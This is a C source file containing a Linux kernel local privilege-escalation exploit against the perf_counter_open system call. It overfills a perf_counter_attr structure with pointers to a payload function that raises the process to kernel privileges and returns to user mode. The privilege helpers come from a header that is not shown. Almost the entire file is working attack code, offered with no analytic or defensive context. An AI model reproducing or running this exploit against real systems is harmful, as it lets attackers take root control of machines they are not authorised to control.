#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sched.h>
#include <sys/mman.h>
#include <string.h>
#include "kernel_header.h"

#undef __NR_perf_counter_open
#ifdef __x86_64__
#define __NR_perf_counter_open 298
#define BUF_SIZE 0x100
#else
#define __NR_perf_counter_open 336
#define BUF_SIZE 0x80
#endif

struct perf_counter_attr {
unsigned int type;
unsigned int size;
};

static void kernel_payload()
{
  kernel_rise_privileges();
  return_to_userland();
}


int main(int argc, char *argv[])
{
	struct perf_counter_attr *ctr;
	int i;

  user_mode_set_env();

	ctr = (struct perf_counter_attr *)malloc(_page_size);
	if (ctr == NULL) {
    __fatal_errno("[!!] malloc: out of memory");
		exit(1);
	}
  
  memset(ctr, 0x00, _page_size);

	ctr->size = BUF_SIZE;
	ctr->type = 0xFFFFFFFF;
	for (i = 0x40; i < BUF_SIZE; i+= sizeof(unsigned long)) {
		if (!(i % (sizeof(unsigned long) * sizeof(unsigned long))))
			continue;

		*(unsigned long *)((char *)ctr + i) = (unsigned long)kernel_payload;
	}

	syscall(__NR_perf_counter_open, ctr, getpid(), 0, 0, 0UL);
        __fatal_errno("[!!] perf_counter_open: System is not vulnerable");

	return 0;
}
